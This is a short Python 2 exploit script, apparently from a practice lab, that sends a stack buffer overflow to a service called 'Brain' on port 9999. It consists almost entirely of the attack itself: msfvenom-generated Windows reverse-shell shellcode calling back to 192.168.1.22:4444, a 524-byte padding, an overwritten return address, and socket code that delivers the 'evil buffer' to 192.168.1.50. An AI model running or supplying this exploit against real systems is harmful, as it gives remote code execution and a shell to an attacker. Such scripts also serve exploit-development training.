#!/usr/bin/python2
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.1.22 LPORT=4444 -b '\x00\x0a\x0d' -f python -v shellcode

shellcode =  "\x90" * 10
shellcode += "\xb8\xac\x66\xfc\x0f\xda\xcd\xd9\x74\x24\xf4\x5b"
shellcode += "\x31\xc9\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\xef"
shellcode += "\x68\x1e\xfa\x13\x9c\x5c\x05\xeb\x5d\x01\x8f\x0e"
shellcode += "\x6c\x01\xeb\x5b\xdf\xb1\x7f\x09\xec\x3a\x2d\xb9"
shellcode += "\x67\x4e\xfa\xce\xc0\xe5\xdc\xe1\xd1\x56\x1c\x60"
shellcode += "\x52\xa5\x71\x42\x6b\x66\x84\x83\xac\x9b\x65\xd1"
shellcode += "\x65\xd7\xd8\xc5\x02\xad\xe0\x6e\x58\x23\x61\x93"
shellcode += "\x29\x42\x40\x02\x21\x1d\x42\xa5\xe6\x15\xcb\xbd"
shellcode += "\xeb\x10\x85\x36\xdf\xef\x14\x9e\x11\x0f\xba\xdf"
shellcode += "\x9d\xe2\xc2\x18\x19\x1d\xb1\x50\x59\xa0\xc2\xa7"
shellcode += "\x23\x7e\x46\x33\x83\xf5\xf0\x9f\x35\xd9\x67\x54"
shellcode += "\x39\x96\xec\x32\x5e\x29\x20\x49\x5a\xa2\xc7\x9d"
shellcode += "\xea\xf0\xe3\x39\xb6\xa3\x8a\x18\x12\x05\xb2\x7a"
shellcode += "\xfd\xfa\x16\xf1\x10\xee\x2a\x58\x7d\xc3\x06\x62"
shellcode += "\x7d\x4b\x10\x11\x4f\xd4\x8a\xbd\xe3\x9d\x14\x3a"
shellcode += "\x03\xb4\xe1\xd4\xfa\x37\x12\xfd\x38\x63\x42\x95"
shellcode += "\xe9\x0c\x09\x65\x15\xd9\x9e\x35\xb9\xb2\x5e\xe5"
shellcode += "\x79\x63\x37\xef\x75\x5c\x27\x10\x5c\xf5\xc2\xeb"
shellcode += "\x37\x3a\xba\xf2\xd1\xd2\xb9\xf4\xcc\x7e\x37\x12"
shellcode += "\x84\x6e\x11\x8d\x31\x16\x38\x45\xa3\xd7\x96\x20"
shellcode += "\xe3\x5c\x15\xd5\xaa\x94\x50\xc5\x5b\x55\x2f\xb7"
shellcode += "\xca\x6a\x85\xdf\x91\xf9\x42\x1f\xdf\xe1\xdc\x48"
shellcode += "\x88\xd4\x14\x1c\x24\x4e\x8f\x02\xb5\x16\xe8\x86"
shellcode += "\x62\xeb\xf7\x07\xe6\x57\xdc\x17\x3e\x57\x58\x43"
shellcode += "\xee\x0e\x36\x3d\x48\xf9\xf8\x97\x02\x56\x53\x7f"
shellcode += "\xd2\x94\x64\xf9\xdb\xf0\x12\xe5\x6a\xad\x62\x1a"
shellcode += "\x42\x39\x63\x63\xbe\xd9\x8c\xbe\x7a\xf9\x6e\x6a"
shellcode += "\x77\x92\x36\xff\x3a\xff\xc8\x2a\x78\x06\x4b\xde"
shellcode += "\x01\xfd\x53\xab\x04\xb9\xd3\x40\x75\xd2\xb1\x66"
shellcode += "\x2a\xd3\x93"


buffer = "A"*524 + "\xf3\x12\x17\x31" + shellcode

try:
     print "\sending evil buffer..."
     s.connect(('192.168.1.50',9999))
     data = s.recv(1024)
     s.send(buffer + '\r\n')
     print "\nDone!"

except:
     print "Count not connect to Brain!"
